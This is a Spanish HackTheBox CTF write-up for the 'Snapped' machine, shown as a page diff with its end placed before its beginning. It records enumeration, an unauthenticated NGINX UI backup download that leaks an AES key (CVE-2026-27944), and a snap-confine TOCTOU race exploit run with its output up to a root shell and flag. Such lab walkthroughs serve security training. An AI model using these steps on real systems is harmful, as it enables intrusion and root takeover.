-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">snap</span> <span class="n">list</span>
-</span></span><span class="line"><span class="cl"><span class="no">Name</span>     <span class="no">Version</span>     <span class="no">Rev</span>    <span class="no">Tracking</span>         <span class="no">Publisher</span>
-</span></span><span class="line"><span class="cl"><span class="n">bare</span>     <span class="mi">1</span><span class="o">.</span><span class="mi">0</span>         <span class="mi">5</span>      <span class="n">latest</span><span class="o">/</span><span class="n">stable</span>    <span class="n">canonical</span><span class="err">✓</span>
-</span></span><span class="line"><span class="cl"><span class="n">core22</span>   <span class="mi">20240731</span>    <span class="mi">1564</span>   <span class="n">latest</span><span class="o">/</span><span class="n">stable</span>    <span class="n">canonical</span><span class="err">✓</span>
-</span></span><span class="line"><span class="cl"><span class="n">firefox</span>  <span class="mi">129</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span>   <span class="mi">4793</span>   <span class="n">latest</span><span class="o">/</span><span class="n">stable</span><span class="o">/</span><span class="err">…</span>  <span class="n">mozilla</span><span class="err">✓</span>
-</span></span><span class="line"><span class="cl"><span class="n">snapd</span>    <span class="mi">2</span><span class="o">.</span><span class="mi">63</span>        <span class="mi">21759</span>  <span class="n">latest</span><span class="o">/</span><span class="n">stable</span>    <span class="n">canonical</span><span class="err">✓</span></span></span></code></pre></div>
-<p>La combinación de <code>snap-confine</code> (v2.63) y <code>systemd-tmpfiles</code> es vulnerable a una condición de carrera <strong>TOCTOU</strong>: permite envenenar el mount namespace e inyectar un objeto compartido <code>ld-linux</code> malicioso, ejecutando código arbitrario como <strong>root</strong>.</p>
-<p>Compilamos el exploit en nuestra máquina atacante:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gcc -O2 -static -o exploit exploit_suid.c
-</span></span><span class="line"><span class="cl">$ gcc -nostdlib -static -Wl,--entry<span class="o">=</span>_start -o librootshell.so librootshell_suid.c</span></span></code></pre></div>
-<p>Subimos los binarios al objetivo mediante la sesión C2 (Penelope SSH):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/exploit
-</span></span><span class="line"><span class="cl">upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/librootshell.so</span></span></code></pre></div>
-<p>Ejecutamos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="o">.</span><span class="n">/</span><span class="n">exploit</span> <span class="n">librootshell</span><span class="o">.</span><span class="n">so</span>
-</span></span><span class="line"><span class="cl"><span class="o">[!]</span>   <span class="no">TRIGGER</span> <span class="err">—</span> <span class="n">swapping</span> <span class="n">directories</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span>   <span class="no">SWAP</span> <span class="no">DONE</span> <span class="err">—</span> <span class="n">race</span> <span class="n">won!</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="n">ld</span><span class="o">-</span><span class="n">linux</span> <span class="k">in</span> <span class="ss">namespace</span><span class="p">:</span> <span class="ss">jonathan</span><span class="p">:</span><span class="n">jonathan</span> <span class="mi">755</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span>   <span class="no">Poisoned</span> <span class="n">namespace</span> <span class="ss">PID</span><span class="p">:</span> <span class="mi">4581</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="no">Phase</span> <span class="mi">5</span><span class="o">]</span> <span class="no">Injecting</span> <span class="n">payload</span> <span class="n">into</span> <span class="n">poisoned</span> <span class="n">namespace</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span>   <span class="n">ld</span><span class="o">-</span><span class="n">linux</span> <span class="n">owned</span> <span class="n">by</span> <span class="n">uid</span> <span class="mi">1000</span> <span class="p">(</span><span class="n">attacker</span><span class="p">)</span><span class="o">.</span> <span class="no">Race</span> <span class="n">confirmed</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="no">Planting</span> <span class="n">busybox</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="no">Writing</span> <span class="n">escape</span> <span class="n">script</span> <span class="err">→</span> <span class="sr">/tmp/s</span><span class="n">h</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="no">Overwriting</span> <span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span>   <span class="no">Payload</span> <span class="n">injected</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="no">Phase</span> <span class="mi">6</span><span class="o">]</span> <span class="no">Triggering</span> <span class="n">root</span> <span class="n">via</span> <span class="no">SUID</span> <span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="n">snap</span><span class="o">-</span><span class="n">confine</span> <span class="err">→</span> <span class="n">snap</span><span class="o">-</span><span class="n">confine</span> <span class="p">(</span><span class="no">SUID</span> <span class="n">trigger</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span>   <span class="no">Exit</span> <span class="ss">status</span><span class="p">:</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="no">Phase</span> <span class="mi">7</span><span class="o">]</span> <span class="no">Verifying</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="no">SUID</span> <span class="n">root</span> <span class="ss">bash</span><span class="p">:</span> <span class="sr">/var/sn</span><span class="n">ap</span><span class="o">/</span><span class="n">firefox</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">bash</span> <span class="p">(</span><span class="n">mode</span> <span class="mi">4755</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Cleaning</span> <span class="n">up</span> <span class="n">background</span> <span class="n">processes</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">================================================================</span>
-</span></span><span class="line"><span class="cl">  <span class="no">ROOT</span> <span class="ss">SHELL</span><span class="p">:</span> <span class="sr">/var/sn</span><span class="n">ap</span><span class="o">/</span><span class="n">firefox</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="nb">p</span>
-</span></span><span class="line"><span class="cl"><span class="o">================================================================</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mi">5</span><span class="o">.</span><span class="mi">1</span><span class="c1">#</span></span></span></code></pre></div>
-<p>Con privilegios de root obtenemos la flag final:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">root</span><span class="vi">@snapped</span><span class="ss">:~</span><span class="c1"># cat /root/root.txt</span>
-</span></span><span class="line"><span class="cl"><span class="mi">80245140</span><span class="n">cb8cd4fe8c9a2cbbb12c4d8a</span></span></span></code></pre></div>
-<p>Pwned!</p>
-<p><img src="/images/gifs/party_raccoon.gif" alt=""></p>
-<hr>
-
-
-      </div>
-
-
-      <footer>
-        
-
-<section class="see-also">
-  
-    
-    
-    
-      <h3 id="también-ver-en-hackthebox">
-        También ver en HackTheBox
-        <a class="heading-link" href="#tambi%c3%a9n-ver-en-hackthebox">
-          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-          <span class="sr-only">Link to heading</span>
-        </a>
-      </h3>
-      <nav>
-        <ul>
-        
-        
-          
-            <li>
-              <a href="/posts/abducted/">Abducted</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/variatype/">VariaType</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/principal/">Principal</a>
-            </li>
-          
-        
-          
-        
-          
-            <li>
-              <a href="/posts/cap/">Cap CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/puppy/">Puppy CTF</a>
-            </li>
-          
-        
-        </ul>
-      </nav>
-    
-  
-</section>
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     David León 
-    ·
-    
-    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-</body>
-</html>
+Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root."><meta name=keywords content="blog,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Snapped CTF"><meta name=twitter:description content="Máquina SnappedLink to headingDificultad: Difícil
+Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root."><meta property="og:url" content="https://justgr0w.github.io/posts/snapped/"><meta property="og:site_name" content="0xjustgr0w"><meta property="og:title" content="Snapped CTF"><meta property="og:description" content="Máquina SnappedLink to headingDificultad: Difícil
+Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root."><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-05-19T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-19T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Hard"><meta property="article:tag" content="HackTheBox"><meta property="og:see_also" content="https://justgr0w.github.io/posts/fireflow/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/abducted/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/variatype/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/principal/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/cap/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/puppy/"><link rel=canonical href=https://justgr0w.github.io/posts/snapped/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://justgr0w.github.io/>0xjustgr0w
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/contact/>Sobre mí</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Proyectos</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://justgr0w.github.io/posts/snapped/>Snapped CTF</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-05-19T00:00:00Z>mayo 19, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+4 minutos de lectura.</span></div><div class=authors><i class="fa-solid fa-user" aria-hidden=true></i>
+<a href=/authors/0xjustgr0w/>0xjustgr0w</a></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/pentesting/>Pentesting</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/ctf/>CTF</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/hard/>Hard</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/hackthebox/>HackTheBox</a></span></div></div></header><div class=post-content><h1 id=máquina-snapped>Máquina Snapped
+<a class=heading-link href=#m%c3%a1quina-snapped><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p><img src=/images/posts/snapped/target.png alt></p><p><strong>Dificultad</strong>: <em>Difícil</em></p><p><strong>Descripción</strong>: El objetivo <code>snapped.htb</code> aloja una aplicación <strong>NGINX UI v2.3.2</strong> sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (<strong>CVE-2026-27944</strong>) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como <code>jonathan</code>. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en <code>snap-confine</code> (v2.63) junto con <code>systemd-tmpfiles</code> (<strong>CVE-2026-3888</strong>), obteniendo shell como root.</p><h1 id=enumeración>Enumeración
+<a class=heading-link href=#enumeraci%c3%b3n><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p><img src=/images/gifs/polish_waiting.gif alt></p><p>Comenzamos verificando conectividad y latencia base contra la IP objetivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>ping</span> <span class=o>-</span><span class=n>c1</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span>
+</span></span><span class=line><span class=cl><span class=no>PING</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span> <span class=p>(</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span><span class=p>)</span> <span class=mi>56</span><span class=p>(</span><span class=mi>84</span><span class=p>)</span> <span class=n>bytes</span> <span class=n>of</span> <span class=n>data</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>64</span> <span class=n>bytes</span> <span class=n>from</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span><span class=p>:</span> <span class=n>icmp_seq</span><span class=o>=</span><span class=mi>1</span> <span class=n>ttl</span><span class=o>=</span><span class=mi>63</span> <span class=n>time</span><span class=o>=</span><span class=mi>93</span><span class=o>.</span><span class=mi>0</span> <span class=n>ms</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>---</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span> <span class=n>ping</span> <span class=n>statistics</span> <span class=o>---</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=n>packets</span> <span class=n>transmitted</span><span class=p>,</span> <span class=mi>1</span> <span class=n>received</span><span class=p>,</span> <span class=mi>0</span><span class=o>%</span> <span class=n>packet</span> <span class=n>loss</span><span class=p>,</span> <span class=n>time</span> <span class=mi>0</span><span class=n>ms</span>
+</span></span><span class=line><span class=cl><span class=n>rtt</span> <span class=n>min</span><span class=o>/</span><span class=n>avg</span><span class=o>/</span><span class=n>max</span><span class=o>/</span><span class=n>mdev</span> <span class=o>=</span> <span class=mi>92</span><span class=o>.</span><span class=mi>962</span><span class=o>/</span><span class=mi>92</span><span class=o>.</span><span class=mi>962</span><span class=o>/</span><span class=mi>92</span><span class=o>.</span><span class=mi>962</span><span class=o>/</span><span class=mi>0</span><span class=o>.</span><span class=mo>000</span> <span class=n>ms</span></span></span></code></pre></div><p>El host responde correctamente. Procedemos con un escaneo completo de puertos TCP y, a continuación, enumeración de servicios en los puertos abiertos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>nmap</span> <span class=o>-</span><span class=nb>p</span><span class=o>-</span> <span class=o>--</span><span class=nb>open</span> <span class=o>-</span><span class=n>sS</span> <span class=o>--</span><span class=n>min</span><span class=o>-</span><span class=n>rate</span> <span class=mi>5000</span> <span class=n>snapped</span><span class=o>.</span><span class=n>htb</span> <span class=o>-</span><span class=n>oG</span> <span class=n>nmap</span><span class=o>/</span><span class=n>allPorts</span></span></span></code></pre></div><p>Identificamos únicamente dos puertos abiertos: <strong>22/tcp</strong> (ssh) y <strong>80/tcp</strong> (http). Ejecutamos un escaneo dirigido con scripts y detección de versiones:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>nmap</span> <span class=o>-</span><span class=n>p22</span><span class=p>,</span><span class=mi>80</span> <span class=o>-</span><span class=n>sCV</span> <span class=o>-</span><span class=no>Pn</span> <span class=o>-</span><span class=n>n</span> <span class=n>snapped</span><span class=o>.</span><span class=n>htb</span> <span class=o>-</span><span class=n>oN</span> <span class=n>nmap</span><span class=o>/</span><span class=n>targeted</span>
+</span></span><span class=line><span class=cl><span class=no>PORT</span>   <span class=no>STATE</span> <span class=no>SERVICE</span> <span class=no>VERSION</span>
+</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>ssh</span>     <span class=no>OpenSSH</span> <span class=mi>9</span><span class=o>.</span><span class=mi>6</span><span class=n>p1</span> <span class=no>Ubuntu</span> <span class=mi>3</span><span class=n>ubuntu13</span><span class=o>.</span><span class=mi>15</span> <span class=p>(</span><span class=no>Ubuntu</span> <span class=no>Linux</span><span class=p>;</span> <span class=n>protocol</span> <span class=mi>2</span><span class=o>.</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>80</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>http</span>    <span class=n>nginx</span> <span class=mi>1</span><span class=o>.</span><span class=mi>24</span><span class=o>.</span><span class=mi>0</span> <span class=p>(</span><span class=no>Ubuntu</span><span class=p>)</span></span></span></code></pre></div><h3 id=web>Web
+<a class=heading-link href=#web><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Fingerprinting de tecnologías sobre el servicio HTTP:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>whatweb</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span>
+</span></span><span class=line><span class=cl><span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span> <span class=o>[</span><span class=mi>302</span> <span class=no>Found</span><span class=o>]</span> <span class=no>Country</span><span class=o>[</span><span class=no>RESERVED</span><span class=o>][</span><span class=no>ZZ</span><span class=o>]</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl><span class=no>HTTPServer</span><span class=o>[</span><span class=no>Ubuntu</span> <span class=no>Linux</span><span class=o>][</span><span class=n>nginx</span><span class=o>/</span><span class=mi>1</span><span class=o>.</span><span class=mi>24</span><span class=o>.</span><span class=mi>0</span> <span class=p>(</span><span class=no>Ubuntu</span><span class=p>)</span><span class=o>]</span><span class=p>,</span> <span class=no>IP</span><span class=o>[</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>67</span><span class=o>.</span><span class=mi>215</span><span class=o>]</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl><span class=no>RedirectLocation</span><span class=o>[</span><span class=ss>http</span><span class=p>:</span><span class=sr>//sn</span><span class=n>apped</span><span class=o>.</span><span class=n>htb</span><span class=o>/]</span><span class=p>,</span> <span class=no>Title</span><span class=o>[</span><span class=mi>302</span> <span class=no>Found</span><span class=o>]</span><span class=p>,</span> <span class=n>nginx</span><span class=o>[</span><span class=mi>1</span><span class=o>.</span><span class=mi>24</span><span class=o>.</span><span class=mi>0</span><span class=o>]</span></span></span></code></pre></div><p>El servidor redirige a <code>http://snapped.htb/</code>, por lo que debemos resolver el dominio localmente. Añadimos la entrada en nuestro <em>/etc/hosts</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=c1># echo -e &#39;# Snapped HTB/n10.129.67.215/tsnapped.htb admin.snapped.htb&#39; &gt;&gt; /etc/hosts</span></span></span></code></pre></div><p>Enumeramos subdominios contra <code>snapped.htb</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>u</span> <span class=s1>&#39;http://snapped.htb&#39;</span> <span class=o>-</span><span class=n>H</span> <span class=s1>&#39;Host: FUZZ.snapped.htb&#39;</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>w</span> <span class=sr>/usr/s</span><span class=n>hare</span><span class=o>/</span><span class=n>seclists</span><span class=o>/</span><span class=no>Discovery</span><span class=o>/</span><span class=no>DNS</span><span class=o>/</span><span class=n>subdomains</span><span class=o>-</span><span class=n>top1million</span><span class=o>-</span><span class=mi>110000</span><span class=o>.</span><span class=n>txt</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>t</span> <span class=mi>20</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>fs</span> <span class=mi>20199</span></span></span></code></pre></div><p>Descubrimos el subdominio <strong><code>admin</code></strong> con respuesta <strong>200</strong> y tamaño <strong>1407 bytes</strong> — un vhost válido. Pasamos a fuzzing de directorios en <code>admin.snapped.htb</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>u</span> <span class=s1>&#39;http://admin.snapped.htb/FUZZ&#39;</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>w</span> <span class=sr>/usr/s</span><span class=n>hare</span><span class=o>/</span><span class=n>seclists</span><span class=o>/</span><span class=no>Discovery</span><span class=o>/</span><span class=no>Web</span><span class=o>-</span><span class=no>Content</span><span class=o>/</span><span class=n>common</span><span class=o>.</span><span class=n>txt</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>t</span> <span class=mi>50</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>php</span><span class=p>,</span><span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>zip</span></span></span></code></pre></div><p>Entre los recursos relevantes encontramos <code>index.html</code> (200), <code>robots.txt</code> (200), <code>mcp</code> (403) y <strong><code>version.json</code></strong> (200). Consultamos la versión expuesta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>curl</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>admin</span><span class=o>.</span><span class=n>snapped</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>version</span><span class=o>.</span><span class=n>json</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;version&#34;</span><span class=ss>:&#34;2.3.2&#34;</span><span class=p>,</span><span class=s2>&#34;build_id&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>,</span><span class=s2>&#34;total_build&#34;</span><span class=p>:</span><span class=mi>512</span><span class=p>}</span></span></span></code></pre></div><p>La versión <strong>2.3.2</strong> corresponde a <strong>NGINX UI</strong> y es vulnerable a <strong>CVE-2026-27944</strong> (descarga de backup sin autenticación con divulgación de clave de cifrado en cabeceras HTTP).</p><h2 id=explotación-inicial--cve-2026-27944>Explotación inicial — CVE-2026-27944
+<a class=heading-link href=#explotaci%c3%b3n-inicial--cve-2026-27944><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>La aplicación expone un endpoint que permite descargar backups del sistema sin autenticación. El backup llega cifrado, pero la clave y el IV se revelan en las cabeceras de respuesta durante la descarga. Usamos el PoC público:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>python</span> <span class=n>cve</span><span class=o>-</span><span class=mi>2026</span><span class=o>-</span><span class=mi>27944</span><span class=o>.</span><span class=n>py</span> <span class=o>--</span><span class=n>target</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>admin</span><span class=o>.</span><span class=n>snapped</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>80</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl>  <span class=o>--</span><span class=n>out</span> <span class=n>backup</span><span class=o>.</span><span class=n>bin</span> <span class=o>--</span><span class=n>decrypt</span></span></span></code></pre></div><h4 id=material-criptográfico>Material criptográfico
+<a class=heading-link href=#material-criptogr%c3%a1fico><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>X-Backup-Security: nicDSFdgQlprXk6P8xbPokORKIebxWQj1Q8QhF5dqR4=:reqUY3keNgOhiaQk4zypVg==
+</span></span><span class=line><span class=cl>AES-256 Key: nicDSFdgQlprXk6P8xbPokORKIebxWQj1Q8QhF5dqR4=
+</span></span><span class=line><span class=cl>AES IV: reqUY3keNgOhiaQk4zypVg==</span></span></code></pre></div><p>Resultado del descifrado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Key</span> <span class=ss>length</span><span class=p>:</span> <span class=mi>32</span> <span class=n>bytes</span> <span class=p>(</span><span class=no>AES</span><span class=o>-</span><span class=mi>256</span> <span class=err>✓</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>IV</span> <span class=n>length</span> <span class=p>:</span> <span class=mi>16</span> <span class=n>bytes</span> <span class=p>(</span><span class=no>AES</span> <span class=n>block</span> <span class=n>size</span> <span class=err>✓</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Extracting</span> <span class=n>encrypted</span> <span class=n>backup</span> <span class=n>to</span> <span class=n>backup_extracted</span>
